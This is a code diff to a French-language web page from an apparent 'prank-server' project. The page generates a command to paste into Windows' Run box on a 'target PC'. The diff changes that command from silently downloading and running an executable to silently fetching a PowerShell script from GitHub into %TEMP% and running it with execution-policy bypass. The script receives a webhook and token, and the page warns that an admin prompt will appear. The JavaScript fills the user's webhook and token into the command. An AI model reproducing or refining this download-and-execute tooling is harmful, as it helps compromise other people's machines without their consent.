@@ -251,7 +251,7 @@
 </header>
 
 <!-- ── SECTION 1 : Generateur de commande ────────────────────────────────── -->
-<p class="section-title">Generer la commande d'installation</p>
+<p class="section-title">Generer la commande d'installation &nbsp;·&nbsp; une invite UAC (admin) apparaitra sur le PC cible</p>
 
 <div class="generator-box">
   <div class="field">
@@ -265,7 +265,7 @@
 </div>
 
 <div class="cmd-box" id="cmdBox">
-  <code id="winrCmd">cmd /c curl -sLo %TEMP%\svc.exe "https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe" && %TEMP%\svc.exe -w "WEBHOOK" -t "TOKEN"</code>
+  <code id="winrCmd">cmd /c curl -sLo %TEMP%\s.ps1 "https://raw.githubusercontent.com/lamziiii/prank-server/master/setup.ps1" && powershell -ep bypass -File %TEMP%\s.ps1 -w "WEBHOOK" -t "TOKEN"</code>
   <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem" onclick="copyCmd()">Copier</button>
 </div>
 
@@ -349,20 +349,22 @@
 <div id="toast"></div>
 
 <script>
-  const EXE_URL = 'https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe';
+  const PS1_URL = 'https://raw.githubusercontent.com/lamziiii/prank-server/master/setup.ps1';
+
+  function buildCmd(webhook, token) {
+    const w = webhook || 'WEBHOOK';
+    const t = token   || 'TOKEN';
+    return `cmd /c curl -sLo %TEMP%\\s.ps1 "${PS1_URL}" && powershell -ep bypass -File %TEMP%\\s.ps1 -w "${w}" -t "${t}"`;
+  }
 
   function updateCmd() {
     const webhook = document.getElementById('genWebhook').value.trim();
     const token   = document.getElementById('genToken').value.trim();
     const box     = document.getElementById('cmdBox');
     const code    = document.getElementById('winrCmd');
-    if (webhook && token) {
-      code.textContent = `cmd /c curl -sLo %TEMP%\\svc.exe "${EXE_URL}" && %TEMP%\\svc.exe -w "${webhook}" -t "${token}"`;
-      box.classList.add('ready');
-    } else {
-      code.textContent = `cmd /c curl -sLo %TEMP%\\svc.exe "${EXE_URL}" && %TEMP%\\svc.exe -w "WEBHOOK" -t "TOKEN"`;
-      box.classList.remove('ready');
-    }
+    code.textContent = buildCmd(webhook, token);
+    if (webhook && token) box.classList.add('ready');
+    else box.classList.remove('ready');
   }
 
   function copyCmd() {
